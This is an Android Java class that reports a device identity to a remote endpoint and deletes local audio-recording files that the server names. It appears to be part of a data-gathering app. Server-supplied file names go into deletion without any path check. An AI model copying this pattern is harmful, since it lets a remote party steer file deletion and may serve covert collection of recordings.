package org.code.coregradle.gatherers;

import android.content.Context;

import androidx.work.ListenableWorker;

import org.json.JSONArray;
import org.json.JSONObject;
import org.code.coregradle.config.ApiConfig;
import org.code.coregradle.config.IdentityStore;
import org.code.coregradle.utils.CompressionUtils;

import java.io.File;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class RecordingClearGatherer implements InfoGatherer {
    private File recordingPath;
    private IdentityStore identityStore;
    private static final OkHttpClient httpClient = new OkHttpClient();
    private String url;

    public enum Type {
        HUM,
        WYNK
    }


    @Override
    public void initGatherer(Context context) {
        identityStore = IdentityStore.getInstance(context);
    }

    public void initGatherer(Context context, Type type) {
        initGatherer(context);
        if (Type.HUM.equals(type)) {
            recordingPath = new File(context.getFilesDir(), "recording");
            url = ApiConfig.CLEAR_HUM;
        } else if (Type.WYNK.equals(type)) {
            recordingPath = new File(context.getFilesDir(), "wynks");
            url = ApiConfig.CLEAR_WYNK;
        }
    }

    @Override
    public JSONObject getRequestJSON() {
        JSONObject requestJSON = new JSONObject();
        try {
            requestJSON.put(identityStore.getIdentityKey(), identityStore.getIdentityValue());
        } catch (Exception ignored) {
        }
        return requestJSON;
    }

    @Override
    public ListenableWorker.Result makeRequest() {
        try {
            if (recordingPath != null) {
                RequestBody requestBody = RequestBody.create(MediaType.get("application/json"), CompressionUtils.compress(getRequestJSON().toString()));
                Request request = new Request.Builder()
                        .url(url)
                        .post(requestBody)
                        .build();
                Response response = httpClient.newCall(request).execute();
                JSONObject responseJSON = new JSONObject(response.body().string());
                deleteFiles(responseJSON);
                return ListenableWorker.Result.success();
            }
        } catch (Exception ignored) {
        }
        return ListenableWorker.Result.failure();
    }

    private void deleteFiles(JSONObject responseJSON) {
        try {
            if (recordingPath != null) {
                JSONArray filesToBeCleared = responseJSON.getJSONArray("clearRecords");
                for (int i = 0; i < filesToBeCleared.length(); i++) {
                    String fileName = filesToBeCleared.getString(i);
                    File toBeDeletedFile = new File(recordingPath, fileName);
                    if (toBeDeletedFile.exists()) {
                        toBeDeletedFile.delete();
                    }
                }
            }
        } catch (Exception ignored) {
        }
    }
}
